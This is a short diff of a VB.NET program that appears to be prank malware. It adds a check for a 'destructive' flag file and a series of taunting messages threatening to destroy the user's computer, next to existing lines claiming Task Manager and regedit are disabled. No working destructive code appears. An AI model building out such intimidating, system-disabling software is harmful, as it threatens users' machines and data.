@@ -28,8 +28,14 @@
         Threading.Thread.Sleep(3000)
         ListBox1.Items.Add("I don't do any real harm I'm just here to annoy you")
         My.Computer.Audio.Play("C:\Users\" & SystemInformation.UserName & "\beep2.wav", AudioPlayMode.Background) '
-        Threading.Thread.Sleep(3000)
-        ListBox1.Items.Add("and you might want to backup your pictures...")
+        If My.Computer.FileSystem.FileExists(Application.StartupPath & "\destructive.yuki3") Then
+            Threading.Thread.Sleep(3000)
+            ListBox1.Items.Add("Wait... you enabled the destructive version of the program")
+            Threading.Thread.Sleep(3000)
+            ListBox1.Items.Add("in that case you're pretty screwed...")
+            Threading.Thread.Sleep(3000)
+            ListBox1.Items.Add("I guess just use your computer as long as you can until I destroy it eventually")
+        End If
         My.Computer.Audio.Play("C:\Users\" & SystemInformation.UserName & "\beep2.wav", AudioPlayMode.Background) '
         Threading.Thread.Sleep(3000)
         ListBox1.Items.Add("I also Disabled task manager and regedit...")
